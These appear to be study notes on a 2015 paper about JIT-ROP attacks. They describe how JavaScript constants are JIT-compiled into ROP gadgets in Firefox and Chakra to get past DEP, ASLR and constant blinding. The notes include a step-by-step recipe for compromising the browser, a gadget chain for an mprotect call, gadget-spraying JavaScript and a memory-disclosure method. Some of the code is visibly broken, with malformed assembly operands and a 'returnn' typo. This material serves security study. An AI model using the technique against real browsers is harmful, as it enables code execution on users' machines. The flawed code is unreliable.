### Attack Summary

To extend ***JIT-ROP***, it is possible to dynamically construct the ROP payload without using any of the available gadgets contained in the browser binary or linked libraries. It is made possible by carefully crafting the input source code so that it contains the required gadgets.

### Attacker Threat Model

Several defenses are up on the system: data execution prevention (DEP), memory randomization (ASLR), stack smashing protection (EMET, canaries). 

### Recipe

(1) The browser ***renders a malicious web page*** (2) The JavaScript code in this page, once compiled, ***produces a series of gadgets in the JIT buffer*** (3)  A memory-disclosure bug ***reveals the locations of the gadgets*** (4) A ROP chain ***is built with the just constructed gadgets*** and control is transferred to it (5) The ROP chain ***calls `VirtualProtect` (or `mprotect`) and makes the page where the shellcode is stored executable*** (6) Control is transferred to the shellcode and the ***browser is compromised***.

### Tools and Setup

**Firefox:** The ROP chain involves seven gadgets:

```assembly
pop %ebx; ret;       // page address
pop %ecx; ret;       // region length
xor %eax; %eax; ret; // 0 before mov
mov 0x7d; %a1; ret;  // mprotect set
xor %edx; %edx; ret; // 0 before mov
mov 0x7; %d1; ret;   // permissions to WRX
int 0x80; ret;       // mprotect call
```

The gadgets need to be added to the JIT buffer and the attacker needs to: (1) trigger a JIT compilation (2) add the gadgets to memory. For (1), creating a "hot loop" will most likely trigger the JIT compilation and for (2), variable are initialized with specially crafted immediate values.

```javascript
var g1 = 0;
// ...
var g7 = 0;
for (var i=0; i<10000; ++i) {
    g1 = 50011;
    g2 = 50009;
    g3 = 12828721;
    g4 = 12811696;
    g5 = 12833329;
    g6 = 12781490;
    g7 = 12812493;
}
```

**Chakra:**

The gadgets have to be generated differently due to the protections that Chakra has: ***constant blinding*** (<2bytes is emitted XORed with a random value), ***long gadgets cannot be encapsulated in immediate values*** (have to be split in several parts), ***code diversification***  (random number of `nop`s between instructions)

```javascript
function r8 (addr) {
    return addr + 0x5841;
}

function r9 (addr) {
    returnn addr + 0x5941;
}

function emit_gadgets() {
    for (i=0; i<10000; i++) {
        rax = 0xc358; // pop rax
        rcx = 0xc359; // pop rcx
        rdx = 0xc35a; // pop rdx
        r8(0);
        r9(0);
    }
    return 0;
}

emit_gadgets();
```

<img src="..//Articles/2015_Athanasakis_The Devil is in the Constants Bypassing Defenses/IE_attack.png" style="zoom: 67%;" />



However, the attacker needs to discover the location of the gadgets. By arbitrarily increasing the length of a JS string object and by reading the string's content, the attacker can read past the end of the string. The attacker can then discover any object's *vtable* and transform the overwrite to a memory disclosure.

<img src="../Articles/2015_Athanasakis_The Devil is in the Constants Bypassing Defenses/DisclosureAttack.png" style="zoom: 67%;" />

